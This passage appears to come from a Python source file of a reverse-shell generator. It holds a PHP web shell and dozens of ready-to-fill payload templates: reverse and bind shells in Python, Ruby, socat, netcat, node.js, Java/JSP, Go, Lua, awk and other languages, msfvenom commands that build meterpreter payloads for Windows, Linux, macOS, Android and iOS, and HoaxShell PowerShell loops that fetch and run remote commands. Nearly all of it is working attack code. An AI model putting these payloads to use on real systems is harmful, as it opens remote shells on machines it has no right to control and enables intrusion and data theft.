=> base64_encode($stdout),\n        \"cwd\" => base64_encode(getcwd())\n    );\n}\n\nfunction featurePwd() {\n    return array(\"cwd\" => base64_encode(getcwd()));\n}\n\nfunction featureHint($fileName, $cwd, $type) {\n    chdir($cwd);\n    if ($type == 'cmd') {\n        $cmd = \"compgen -c $fileName\";\n    } else {\n        $cmd = \"compgen -f $fileName\";\n    }\n    $cmd = \"/bin/bash -c \\\"$cmd\\\"\";\n    $files = explode(\"\\n\", shell_exec($cmd));\n    foreach ($files as &$filename) {\n        $filename = base64_encode($filename);\n    }\n    return array(\n        'files' => $files,\n    );\n}\n\nfunction featureDownload($filePath) {\n    $file = @file_get_contents($filePath);\n    if ($file === FALSE) {\n        return array(\n            'stdout' => base64_encode('File not found / no read permission.'),\n            'cwd' => base64_encode(getcwd())\n        );\n    } else {\n        return array(\n            'name' => base64_encode(basename($filePath)),\n            'file' => base64_encode($file)\n        );\n    }\n}\n\nfunction featureUpload($path, $file, $cwd) {\n    chdir($cwd);\n    $f = @fopen($path, 'wb');\n    if ($f === FALSE) {\n        return array(\n            'stdout' => base64_encode('Invalid path / no write permission.'),\n            'cwd' => base64_encode(getcwd())\n        );\n    } else {\n        fwrite($f, base64_decode($file));\n        fclose($f);\n        return array(\n            'stdout' => base64_encode('Done.'),\n            'cwd' => base64_encode(getcwd())\n        );\n    }\n}\n\nif (isset($_GET[\"feature\"])) {\n\n    $response = NULL;\n\n    switch ($_GET[\"feature\"]) {\n        case \"shell\":\n            $cmd = $_POST['cmd'];\n            if (!preg_match('/2>/', $cmd)) {\n                $cmd .= ' 2>&1';\n            }\n            $response = featureShell($cmd, $_POST[\"cwd\"]);\n            break;\n        case \"pwd\":\n            $response = featurePwd();\n            break;\n        case \"hint\":\n            $response = featureHint($_POST['filename'], $_POST['cwd'], $_POST['type']);\n            break;\n        case 'upload':\n            $response = featureUpload($_POST['path'], $_POST['file'], $_POST['cwd']);\n    }\n\n    header(\"Content-Type: application/json\");\n    echo json_encode($response);\n    die();\n}\n\n?><!DOCTYPE html>\n<html>\n    <head>\n        <meta charset=\"UTF-8\" />\n        <title>p0wny@shell:~#</title>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />\n    </head>\n    <body>\n        <div id=\"shell\">\n            <pre id=\"shell-content\">\n                <div id=\"shell-logo\">\n        ___                         ____      _          _ _        _  _\n _ __  / _ \\__      ___ __  _   _  / __ \\ ___| |__   ___| | |_ /\\|| || |_\n| '_ \\| | | \\ \\ /\\ / / '_ \\| | | |/ / _` / __| '_ \\ / _ \\ | (_)/\\/_  ..  _|\n| |_) | |_| |\\ V  V /| | | | |_| | | (_| \\__ \\ | | |  __/ | |_   |_      _|\n| .__/ \\___/  \\_/\\_/ |_| |_|\\__, |\\ \\__,_|___/_| |_|\\___|_|_(_)    |_||_|\n|_|                         |___/  \\____/\n                </div>\n            </pre>\n        </div>\n    </body>\n</html>",
        "meta": ["windows", "linux", "mac"]
    },
    {
        "name": "Python #1",
        "command": "export RHOST=\"{ip}\";export RPORT={port};python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Python #2",
        "command": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Python3 #1",
        "command": "export RHOST=\"{ip}\";export RPORT={port};python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"{shell}\")'",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Python3 #2",
        "command": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"{shell}\")'",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Python3 Windows",
        "command": "import os,socket,subprocess,threading;\ndef s2p(s, p):\n    while True:\n        data = s.recv(1024)\n        if len(data) > 0:\n            p.stdin.write(data)\n            p.stdin.flush()\n\ndef p2s(s, p):\n    while True:\n        s.send(p.stdout.read(1))\n\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"{ip}\",{port}))\n\np=subprocess.Popen([\"{shell}\"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)\n\ns2p_thread = threading.Thread(target=s2p, args=[s, p])\ns2p_thread.daemon = True\ns2p_thread.start()\n\np2s_thread = threading.Thread(target=p2s, args=[s, p])\np2s_thread.daemon = True\np2s_thread.start()\n\ntry:\n    p.wait()\nexcept KeyboardInterrupt:\n    s.close()",
        "meta": ["windows"]
    },
    {
        "name": "Python3 shortest",
        "command": "python3 -c 'import os,pty,socket;s=socket.socket();s.connect((\"{ip}\",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"{shell}\")'",
        "meta": ["linux"]
    },
    {
        "name": "Ruby #1",
        "command": "ruby -rsocket -e'spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"{ip}\",{port}))'",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Ruby no sh",
        "command": "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{ip}\",\"{port}\");loop{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts \"failed: #{$_}\"}'",
        "meta": ["linux", "mac"]
    },
    {
        "name": "socat #1",
        "command": "socat TCP:{ip}:{port} EXEC:{shell}",
        "meta": ["linux", "mac"]
    },
    {
        "name": "socat #2 (TTY)",
        "command": "socat TCP:{ip}:{port} EXEC:'{shell}',pty,stderr,setsid,sigint,sane",
        "meta": ["linux", "mac"]
    },
    {
        "name": "sqlite3 nc mkfifo",
        "command": "sqlite3 /dev/null '.shell rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f'",
        "meta": ["linux", "mac"]
    },
    {
        "name": "node.js",
        "command": "require('child_process').exec('nc -e {shell} {ip} {port}')",
        "meta": ["linux", "mac"]
    },
    {
        "name": "node.js #2",
        "command": "(function(){\n    var net = require(\"net\"),\n        cp = require(\"child_process\"),\n        sh = cp.spawn(\"{shell}\", []);\n    var client = new net.Socket();\n    client.connect({port}, \"{ip}\", function(){\n        client.pipe(sh.stdin);\n        sh.stdout.pipe(client);\n        sh.stderr.pipe(client);\n    });\n    return /a/;\n})();",
        "meta": ["linux", "mac", "windows"]
    },
    {
        "name": "Java #1",
        "command": "public class shell {\n    public static void main(String[] args) {\n        Process p;\n        try {\n            p = Runtime.getRuntime().exec(\"bash -c $@|bash 0 echo bash -i >& /dev/tcp/{ip}/{port} 0>&1\");\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Java #2",
        "command": "public class shell {\n    public static void main(String[] args) {\n        ProcessBuilder pb = new ProcessBuilder(\"bash\", \"-c\", \"$@| bash -i >& /dev/tcp/{ip}/{port} 0>&1\")\n            .redirectErrorStream(true);\n        try {\n            Process p = pb.start();\n            p.waitFor();\n            p.destroy();\n        } catch (Exception e) {}\n    }\n}",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Java #3",
        "command": "import java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.Socket;\n\npublic class shell {\n    public static void main(String[] args) {\n        String host = \"{ip}\";\n        int port = {port};\n        String cmd = \"{shell}\";\n        try {\n            Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();\n            Socket s = new Socket(host, port);\n            InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\n            OutputStream po = p.getOutputStream(), so = s.getOutputStream();\n            while (!s.isClosed()) {\n                while (pi.available() > 0)\n                    so.write(pi.read());\n                while (pe.available() > 0)\n                    so.write(pe.read());\n                while (si.available() > 0)\n                    po.write(si.read());\n                so.flush();\n                po.flush();\n                Thread.sleep(50);\n                try {\n                    p.exitValue();\n                    break;\n                } catch (Exception e) {}\n            }\n            p.destroy();\n            s.close();\n        } catch (Exception e) {}\n    }\n}",
        "meta": ["windows", "linux", "mac"]
    },
    {
        "name": "Java Web",
        "command": "<%@\npage import=\"java.lang.*, java.util.*, java.io.*, java.net.*\"\n% >\n<%!\nstatic class StreamConnector extends Thread\n{\n        InputStream is;\n        OutputStream os;\n        StreamConnector(InputStream is, OutputStream os)\n        {\n                this.is = is;\n                this.os = os;\n        }\n        public void run()\n        {\n                BufferedReader isr = null;\n                BufferedWriter osw = null;\n                try\n                {\n                        isr = new BufferedReader(new InputStreamReader(is));\n                        osw = new BufferedWriter(new OutputStreamWriter(os));\n                        char buffer[] = new char[8192];\n                        int lenRead;\n                        while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)\n                        {\n                                osw.write(buffer, 0, lenRead);\n                                osw.flush();\n                        }\n                }\n                catch (Exception ioe)\n                try\n                {\n                        if(isr != null) isr.close();\n                        if(osw != null) osw.close();\n                }\n                catch (Exception ioe)\n        }\n}\n%>\n\n<h1>JSP Backdoor Reverse Shell</h1>\n\n<form method=\"post\">\nIP Address\n<input type=\"text\" name=\"ipaddress\" size=30>\nPort\n<input type=\"text\" name=\"port\" size=10>\n<input type=\"submit\" name=\"Connect\" value=\"Connect\">\n</form>\n<p>\n<hr>\n\n<%\nString ipAddress = request.getParameter(\"ipaddress\");\nString ipPort = request.getParameter(\"port\");\nif(ipAddress != null && ipPort != null)\n{\n        Socket sock = null;\n        try\n        {\n                sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());\n                Runtime rt = Runtime.getRuntime();\n                Process proc = rt.exec(\"cmd.exe\");\n                StreamConnector outputConnector =\n                        new StreamConnector(proc.getInputStream(),\n                                          sock.getOutputStream());\n                StreamConnector inputConnector =\n                        new StreamConnector(sock.getInputStream(),\n                                          proc.getOutputStream());\n                outputConnector.start();\n                inputConnector.start();\n        }\n        catch(Exception e)\n}\n%>",
        "meta": ["windows", "linux", "mac"]
    },
    {
        "name": "Java Two Way",
        "command": "<%\n    /*\n     * Usage: This is a 2 way shell, one web shell and a reverse shell.\n     */\n%>\n\n<%@page import=\"java.lang.*\"%>\n<%@page import=\"java.io.*\"%>\n<%@page import=\"java.net.*\"%>\n<%@page import=\"java.util.*\"%>\n\n<html>\n<head>\n    <title>jrshell</title>\n</head>\n<body>\n<form METHOD=\"POST\" NAME=\"myform\" ACTION=\"\">\n    <input TYPE=\"text\" NAME=\"shell\">\n    <input TYPE=\"submit\" VALUE=\"Send\">\n</form>\n<pre>\n<%\n    String shellPath = null;\n    try\n    {\n        if (System.getProperty(\"os.name\").toLowerCase().indexOf(\"windows\") == -1) {\n            shellPath = new String(\"/bin/sh\");\n        } else {\n            shellPath = new String(\"cmd.exe\");\n        }\n    } catch( Exception e ){}\n    if (request.getParameter(\"shell\") != null) {\n        out.println(\"Command: \" + request.getParameter(\"shell\") + \"\\n<BR>\");\n        Process p;\n        if (shellPath.equals(\"cmd.exe\"))\n            p = Runtime.getRuntime().exec(\"cmd.exe /c \" + request.getParameter(\"shell\"));\n        else\n            p = Runtime.getRuntime().exec(\"/bin/sh -c \" + request.getParameter(\"shell\"));\n        OutputStream os = p.getOutputStream();\n        InputStream in = p.getInputStream();\n        DataInputStream dis = new DataInputStream(in);\n        String disr = dis.readLine();\n        while ( disr != null ) {\n            out.println(disr);\n            disr = dis.readLine();\n        }\n    }\n    class StreamConnector extends Thread\n    {\n        InputStream wz;\n        OutputStream yr;\n        StreamConnector( InputStream wz, OutputStream yr ) {\n            this.wz = wz;\n            this.yr = yr;\n        }\n        public void run()\n        {\n            BufferedReader r  = null;\n            BufferedWriter w = null;\n            try\n            {\n                r  = new BufferedReader(new InputStreamReader(wz));\n                w = new BufferedWriter(new OutputStreamWriter(yr));\n                char buffer[] = new char[8192];\n                int length;\n                while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )\n                {\n                    w.write( buffer, 0, length );\n                    w.flush();\n                }\n            } catch( Exception e ){}\n            try\n            {\n                if( r != null )\n                    r.close();\n                if( w != null )\n                    w.close();\n            } catch( Exception e ){}\n        }\n    }\n\n    try {\n        Socket socket = new Socket( \"{ip}\", {port} );\n        Process process = Runtime.getRuntime().exec( shellPath );\n        new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();\n        new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();\n        out.println(\"port opened on \" + socket);\n     } catch( Exception e ) {}\n%>\n</pre>\n</body>\n</html>",
        "meta": ["windows", "linux", "mac"]
    },
    {
        "name": "Javascript",
        "command": "String command = \"var host = '{ip}';\" +\n                       \"var port = {port};\" +\n                       \"var cmd = '{shell}';\"+\n                       \"var s = new java.net.Socket(host, port);\" +\n                       \"var p = new java.lang.ProcessBuilder(cmd).redirectErrorStream(true).start();\"+\n                       \"var pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();\"+\n                       \"var po = p.getOutputStream(), so = s.getOutputStream();\"+\n                       \"print ('Connected');\"+\n                       \"while (!s.isClosed()) {\"+\n                       \"    while (pi.available() > 0)\"+\n                       \"        so.write(pi.read());\"+\n                       \"    while (pe.available() > 0)\"+\n                       \"        so.write(pe.read());\"+\n                       \"    while (si.available() > 0)\"+\n                       \"        po.write(si.read());\"+\n                       \"    so.flush();\"+\n                       \"    po.flush();\"+\n                       \"    java.lang.Thread.sleep(50);\"+\n                       \"    try {\"+\n                       \"        p.exitValue();\"+\n                       \"        break;\"+\n                       \"    }\"+\n                       \"    catch (e) {\"+\n                       \"    }\"+\n                       \"}\"+\n                       \"p.destroy();\"+\n                       \"s.close();\";\nString x = \"\\\"\\\".getClass().forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"JavaScript\\\").eval(\\\"\"+command+\"\\\")\";\nref.add(new StringRefAddr(\"x\", x);",
        "meta": ["linux", "mac", "windows"]
    },
    {
        "name": "Groovy",
        "command": "String host=\"{ip}\";int port={port};String cmd=\"{shell}\";Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();",
        "meta": ["windows"]
    },
    {
        "name": "telnet",
        "command": "TF=$(mktemp -u);mkfifo $TF && telnet {ip} {port} 0<$TF | {shell} 1>$TF",
        "meta": ["linux", "mac"]
    },
    {
        "name": "telnet mknod",
        "command": "mknod backpipe p && telnet {ip} {port} 0<backpipe | {shell} 1>backpipe",
        "meta": ["linux", "mac"]
    },
    {
        "name": "telnet 输入输出分离",
        "command": "telnet {ip} 65534 | {shell} | telnet {ip} 65535",
        "meta": ["linux", "mac"]
    },
    {
        "name": "zsh",
        "command": "zsh -c 'zmodload zsh/net/tcp && ztcp {ip} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Lua #1",
        "command": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('{shell} -i <&3 >&3 2>&3');\"",
        "meta": ["linux"]
    },
    {
        "name": "Lua #2",
        "command": "lua5.1 -e 'local host, port = \"{ip}\", {port} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'",
        "meta": ["linux", "windows"]
    },
    {
        "name": "Golang",
        "command": "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"{ip}:{port}\");cmd:=exec.Command(\"{shell}\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
        "meta": ["linux", "mac", "windows"]
    },
    {
        "name": "Golang2",
        "command": "echo 'package main;import\"os/exec\";import\"log\";func main() {cmdline := \"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done\";cmd := exec.Command(\"/bin/bash\", \"-c\", cmdline);bytes, err := cmd.Output();if err != nil {log.Println(err);}resp := string(bytes);log.Println(resp);}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
        "meta": ["linux", "mac", "windows"]
    },
    {
        "name": "Golang3",
        "command": "echo 'package main;import\"os/exec\";import\"log\";func main(){cmdline := \"bash -i >& /dev/tcp/{ip}/{port} 0>&1\";cmd := exec.Command(\"/bin/bash\", \"-c\", cmdline);}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
        "meta": ["linux", "mac", "windows"]
    },
    {
        "name": "Vlang",
        "command": "echo 'import os' > /tmp/t.v && echo 'fn main() { os.system(\"nc -e {shell} {ip} {port} 0>&1\") }' >> /tmp/t.v && v run /tmp/t.v && rm /tmp/t.v",
        "meta": ["linux", "mac"]
    },
    {
        "name": "TCL脚本",
        "command": "set s [socket {ip} {port}]; while 42 { puts -nonewline $s \"shell>\"; flush $s; gets $s c; set e \"exec $c\"; if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Awk",
        "command": "awk 'BEGIN {s = \"/inet/tcp/0/{ip}/{port}\"; while(42) { do{ printf \"shell>\" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != \"exit\") close(s); }}' /dev/null",
        "meta": ["linux", "mac"]
    },
    {
        "name": "Dart",
        "command": "import 'dart:io';\nimport 'dart:convert';\n\nmain() {\n  Socket.connect(\"{ip}\", {port}).then((socket) {\n    socket.listen((data) {\n      Process.start('{shell}', []).then((Process process) {\n        process.stdin.writeln(new String.fromCharCodes(data).trim());\n        process.stdout\n          .transform(utf8.decoder)\n          .listen((output) { socket.write(output); });\n      });\n    },\n    onDone: () {\n      socket.destroy();\n    });\n  });\n}",
        "meta": ["linux", "mac", "windows"]
    },
    {
        "name": "Crystal (system)",
        "command": "crystal eval 'require \"process\";require \"socket\";c=Socket.tcp(Socket::Family::INET);c.connect(\"{ip}\",{port});loop{m,l=c.receive;p=Process.new(m.rstrip(\"\\n\"),output:Process::Redirect::Pipe,shell:true);c<<p.output.gets_to_end}'",
        "meta": ["linux", "windows", "mac"]
    },
    {
        "name": "Crystal (code)",
        "command": "require \"process\"\nrequire \"socket\"\n\nc = Socket.tcp(Socket::Family::INET)\nc.connect(\"{ip}\", {port})\nloop do \n  m, l = c.receive\n  p = Process.new(m.rstrip(\"\\n\"), output:Process::Redirect::Pipe, shell:true)\n  c << p.output.gets_to_end\nend",
        "meta": ["linux", "mac"]
    }
])


# ============================================================================
# 绑定 Shell 命令 (9 条)
# ============================================================================

BIND_SHELL_COMMANDS = _tag(CommandType.BindShell, [
    {
        "name": "nc -e Bind",
        "command": "nc -nlvp {port} -e /bin/sh",
        "meta": ["bind", "mac", "linux"]
    },
    {
        "name": "nc.exe -e Bind",
        "command": "nc.exe -nlvp {port} -e cmd",
        "meta": ["bind", "windows"]
    },
    {
        "name": "nc mkfifo Bind",
        "command": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 {port} > /tmp/f",
        "meta": ["bind", "mac", "linux"]
    },
    {
        "name": "ncat -e Bind",
        "command": "ncat -nlvp {port} -e /bin/sh",
        "meta": ["bind", "mac", "linux"]
    },
    {
        "name": "Perl Bind",
        "command": "perl -e 'use Socket;$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));bind(S,sockaddr_in($p, INADDR_ANY));listen(S,SOMAXCONN);for(;$p=accept(C,S);close C){open(STDIN,\">&C\");open(STDOUT,\">&C\");open(STDERR,\">&C\");exec(\"/bin/sh -i\");};'",
        "meta": ["bind", "mac", "linux"]
    },
    {
        "name": "PHP Bind",
        "command": "php -r '$s=socket_create(AF_INET,SOCK_STREAM,SOL_TCP);socket_bind($s,\"0.0.0.0\",{port});socket_listen($s,1);$cl=socket_accept($s);while(1){if(!socket_write($cl,\"$ \",2))exit;$in=socket_read($cl,100);$cmd=popen(\"$in\",\"r\");while(!feof($cmd)){$m=fgetc($cmd);socket_write($cl,$m,strlen($m));}}'",
        "meta": ["bind", "mac", "linux", "windows"]
    },
    {
        "name": "Python3 Bind",
        "command": "python3 -c 'exec(\"\"\"import socket as s,subprocess as sp;s1=s.socket(s.AF_INET,s.SOCK_STREAM);s1.setsockopt(s.SOL_SOCKET,s.SO_REUSEADDR, 1);s1.bind((\"0.0.0.0\",{port}));s1.listen(1);c,a=s1.accept();\nwhile True: d=c.recv(1024).decode();p=sp.Popen(d,shell=True,stdout=sp.PIPE,stderr=sp.PIPE,stdin=sp.PIPE);c.sendall(p.stdout.read()+p.stderr.read())\"\"\")'",
        "meta": ["bind", "mac", "linux", "windows"]
    },
    {
        "name": "Ruby Bind",
        "command": "ruby -rsocket -e 'f=TCPServer.new(9001); s=f.accept; [0,1,2].each { |fd| IO.new(fd).reopen(s) }; exec \"/bin/sh -i\"'",
        "meta": ["bind", "mac", "linux"]
    },
    {
        "name": "Socat (TTY) Bind",
        "command": "socat TCP-LISTEN:{port},reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane",
        "meta": ["bind", "mac", "linux"]
    }
])


# ============================================================================
# MSFVenom 命令 (18 条)
# ============================================================================

MSFVENOM_COMMANDS = _tag(CommandType.MSFVenom, [
    {
        "name": "Windows Meterpreter Staged Reverse TCP (x64)",
        "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
        "meta": ["msfvenom", "windows", "staged", "meterpreter", "reverse"]
    },
    {
        "name": "Windows Meterpreter Stageless Reverse TCP (x64)",
        "command": "msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
        "meta": ["msfvenom", "windows", "stageless", "reverse"]
    },
    {
        "name": "Windows Staged Reverse TCP (x64)",
        "command": "msfvenom -p windows/x64/shell/reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
        "meta": ["msfvenom", "windows", "staged", "meterpreter", "reverse"]
    },
    {
        "name": "Windows Stageless Reverse TCP (x64)",
        "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe -o reverse.exe",
        "meta": ["msfvenom", "windows", "stageless", "reverse"]
    },
    {
        "name": "Windows Staged JSP Reverse TCP",
        "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f jsp -o ./rev.jsp",
        "meta": ["msfvenom", "windows", "staged", "reverse"]
    },
    {
        "name": "Windows Staged ASPX Reverse TCP",
        "command": "msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx",
        "meta": ["msfvenom", "windows", "staged", "reverse"]
    },
    {
        "name": "Windows Staged ASPX Reverse TCP (x64)",
        "command": "msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f aspx -o reverse.aspx",
        "meta": ["msfvenom", "windows", "staged", "reverse"]
    },
    {
        "name": "Linux Meterpreter Staged Reverse TCP (x64)",
        "command": "msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf",
        "meta": ["msfvenom", "linux", "meterpreter", "staged", "reverse"]
    },
    {
        "name": "Linux Stageless Reverse TCP (x64)",
        "command": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf -o reverse.elf",
        "meta": ["msfvenom", "linux", "meterpreter", "stageless", "reverse"]
    },
    {
        "name": "Windows Bind TCP ShellCode - BOF",
        "command": "msfvenom -a x86 --platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b '\\x00' -f python -v notBuf -o shellcode",
        "meta": ["msfvenom", "windows", "bind", "bufferoverflow"]
    },
    {
        "name": "macOS Meterpreter Staged Reverse TCP (x64)",
        "command": "msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
        "meta": ["msfvenom", "mac", "stageless", "reverse"]
    },
    {
        "name": "macOS Meterpreter Stageless Reverse TCP (x64)",
        "command": "msfvenom -p osx/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
        "meta": ["msfvenom", "mac", "stageless", "reverse"]
    },
    {
        "name": "macOS Stageless Reverse TCP (x64)",
        "command": "msfvenom -p osx/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f macho -o shell.macho",
        "meta": ["msfvenom", "mac", "stageless", "reverse"]
    },
    {
        "name": "PHP Meterpreter Stageless Reverse TCP",
        "command": "msfvenom -p php/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.php",
        "meta": ["msfvenom", "windows", "linux", "meterpreter", "stageless", "reverse"]
    },
    {
        "name": "PHP Reverse PHP",
        "command": "msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -o shell.php",
        "meta": ["msfvenom", "windows", "linux", "meterpreter", "stageless", "reverse"]
    },
    {
        "name": "JSP Stageless Reverse TCP",
        "command": "msfvenom -p java/jsp_shell_reverse_tcp LHOST={ip} LPORT={port} -f raw -o shell.jsp",
        "meta": ["msfvenom", "windows", "linux", "meterpreter", "stageless", "reverse"]
    },
    {
        "name": "WAR Stageless Reverse TCP",
        "command": "msfvenom -p java/shell_reverse_tcp LHOST={ip} LPORT={port} -f war -o shell.war",
        "meta": ["msfvenom", "windows", "linux", "stageless", "reverse"]
    },
    {
        "name": "Android Meterpreter Reverse TCP",
        "command": "msfvenom --platform android -p android/meterpreter/reverse_tcp lhost={ip} lport={port} R -o malicious.apk",
        "meta": ["msfvenom", "android", "android", "reverse"]
    },
    {
        "name": "Android Meterpreter Embed Reverse TCP",
        "command": "msfvenom --platform android -x template-app.apk -p android/meterpreter/reverse_tcp lhost={ip} lport={port} -o payload.apk",
        "meta": ["msfvenom", "android", "android", "reverse"]
    },
    {
        "name": "Apple iOS Meterpreter Reverse TCP Inline",
        "command": "msfvenom --platform apple_ios -p apple_ios/aarch64/meterpreter_reverse_tcp lhost={ip} lport={port} -f macho -o payload",
        "meta": ["msfvenom", "apple_ios", "apple_ios", "reverse"]
    },
    {
        "name": "Python Stageless Reverse TCP",
        "command": "msfvenom -p cmd/unix/reverse_python LHOST={ip} LPORT={port} -f raw",
        "meta": ["msfvenom", "windows", "linux", "stageless", "reverse"]
    },
    {
        "name": "Bash Stageless Reverse TCP",
        "command": "msfvenom -p cmd/unix/reverse_bash LHOST={ip} LPORT={port} -f raw -o shell.sh",
        "meta": ["msfvenom", "linux", "macos", "stageless", "reverse"]
    },
])


# ============================================================================
# HoaxShell 命令 (10 条)
# ============================================================================

HOAXSHELL_COMMANDS = _tag(CommandType.HoaxShell, [
    {
        "name": "Windows CMD cURL",
        "command": '@echo off&cmd /V:ON /C "SET ip={ip}:{port}&&SET sid="Authorization: eb6a44aa-8acc1e56-629ea455"&&SET protocol=http://&&curl !protocol!!ip!/eb6a44aa -H !sid! > NUL && for /L %i in (0) do (curl -s !protocol!!ip!/8acc1e56 -H !sid! > !temp!\\cmd.bat & type !temp!\\cmd.bat | findstr None > NUL & if errorlevel 1 ((!temp!\\cmd.bat > !tmp!\\out.txt 2>&1) & curl !protocol!!ip!/629ea455 -X POST -H !sid! --data-binary @!temp!\\out.txt > NUL)) & timeout 1" > NUL',
        "meta": ["windows"]
    },
    {
        "name": "PowerShell IEX",
        "command": "$s='{ip}:{port}';$i='14f30f27-650c00d7-fef40df7';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/14f30f27 -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/650c00d7 -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/fef40df7 -Method POST -Headers @{\"Authorization\"=$i} -Body ([System.Text.Encoding]::UTF8.GetBytes($e+$r) -join ' ')} sleep 0.8}",
        "meta": ["windows"]
    },
    {
        "name": "PowerShell IEX Constr Lang Mode",
        "command": "$s='{ip}:{port}';$i='bf5e666f-5498a73c-34007c82';$p='http://';$v=IRM -UseBasicParsing -Uri $p$s/bf5e666f -Headers @{\"Authorization\"=$i};while ($true){$c=(IRM -UseBasicParsing -Uri $p$s/5498a73c -Headers @{\"Authorization\"=$i});if ($c -ne 'None') {$r=IEX $c -ErrorAction Stop -ErrorVariable e;$r=Out-String -InputObject $r;$t=IRM -Uri $p$s/34007c82 -Method POST -Headers @{\"Authorization\"=$i} -Body ($e+$r)} sleep 0.8}",
        "meta": ["windows"]
    },
    {
        "name": "PowerShell Outfile",
